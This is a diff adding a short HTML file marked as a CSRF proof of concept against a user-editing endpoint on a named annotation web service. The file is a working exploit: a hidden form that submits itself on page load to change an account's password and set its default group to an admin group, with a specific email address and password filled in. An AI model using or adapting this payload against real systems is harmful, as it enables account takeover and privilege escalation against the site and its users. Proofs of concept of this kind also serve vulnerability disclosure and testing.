@@ -1,0 +1,22 @@
+<html>
+  <!-- CSRF PoC - nb1b3k -->
+  <body onload="submitForm()">
+    <form id="myForm" action="https://annotator.bii.a-star.edu.sg/annie/EditUser.do" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="urnparam" value="bio:user:sanjayrana02@mailna.in" />
+      <input type="hidden" name="login" value="sanjayrana02@mailna.in" />
+      <input type="hidden" name="fullName" value="testuser" />
+      <input type="hidden" name="email" value="sanjayrana02@mailna.in" />
+      <input type="hidden" name="newPasswd" value="AqWdZNMCfm" />
+      <input type="hidden" name="repeatNewPasswd" value="AqWdZNMCfm" />
+      <input type="hidden" name="modellerKey" value="" />
+      <input type="hidden" name="defaultGroup" value="bio:group:admin" />
+      <input type="hidden" name="submit" value="Change" />
+      <input type="submit" id="submitButton" value="Submit request" />
+    </form>
+    <script>
+      function submitForm() {
+        document.getElementById('submitButton').click();
+      }
+    </script>
+  </body>
+</html>
